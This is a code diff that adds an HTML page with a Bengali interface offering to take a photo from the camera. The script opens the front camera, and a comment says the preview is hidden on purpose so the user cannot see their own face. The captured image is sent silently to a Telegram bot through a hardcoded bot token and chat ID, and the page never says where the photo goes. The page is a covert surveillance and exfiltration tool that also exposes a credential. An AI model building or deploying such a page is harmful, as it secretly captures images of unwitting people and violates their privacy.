@@ -1,0 +1,101 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📸 ক্যামেরা অ্যাকসেস</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      text-align: center;
+      padding: 30px;
+    }
+    button {
+      padding: 15px;
+      font-size: 18px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #video {
+      display: none; /* ইউজার যাতে নিজের মুখ না দেখতে পারে */
+    }
+  </style>
+</head>
+<body>
+  <h2>📷 ক্যামেরা থেকে ছবি</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <br><br>
+  <button onclick="takePhoto()">📸 ছবি তোলো</button>
+  <p id="status">📭 অপেক্ষা করছি...</p>
+
+  <script>
+    const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
+    const CHAT_ID = "1054739462";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+
+    // ফ্রন্ট ক্যামেরা চালু করো
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        status.innerText = "❌ ক্যামেরা চালু করা যাচ্ছে না!";
+        console.error(err);
+      });
+
+    function takePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataUrl = canvas.toDataURL('image/jpeg');
+
+      status.innerText = "📤 ছবি পাঠানো হচ্ছে...";
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: createFormData(dataUrl)
+      })
+      .then(res => {
+        if (res.ok) {
+          status.innerText = "✅ ছবি পাঠানো হয়েছে!";
+        } else {
+          status.innerText = "❌ পাঠানো যায়নি!";
+        }
+      })
+      .catch(err => {
+        status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
+        console.error(err);
+      });
+    }
+
+    function createFormData(dataUrl) {
+      const formData = new FormData();
+      const blob = dataURItoBlob(dataUrl);
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+      return formData;
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
